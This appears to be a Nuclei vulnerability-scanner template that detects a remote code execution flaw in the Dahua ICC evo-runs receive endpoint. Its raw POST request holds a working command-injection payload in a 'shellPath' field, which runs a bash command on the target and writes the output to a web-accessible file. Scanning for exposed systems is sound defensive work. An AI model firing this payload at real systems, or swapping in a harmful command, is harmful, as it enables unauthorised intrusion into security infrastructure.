id: dahua-icc-rce

info:
  name: Dahua ICC evo-runsv1.0 RCE
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    This template detects potential remote code execution (RCE) vulnerability in Dahua ICC evo-runsv1.0 `/evo-runs/v1.0/receive` endpoint by sending a malicious payload.
  tags: rce,dahua

http:
  - raw:
      - |
        POST /evo-runs/v1.0/receive HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip
        Connection: keep-alive
        Content-Length: 249
        Content-Type: application/json
        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36
        X-Subject-Headerflag: ADAPT

        {
          "method": "agent.ossm.mapping.config",
          "info": {
            "configure": "abcd",
            "filePath": "haha",
            "paramMap": {
              "shellPath": "/bin/bash -c df>/opt/evoWpms/static/macvguun.txt",
              "filePath": "abc"
            },
            "requestIp": ""
          }
        }

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "macvguun.txt"
        part: body
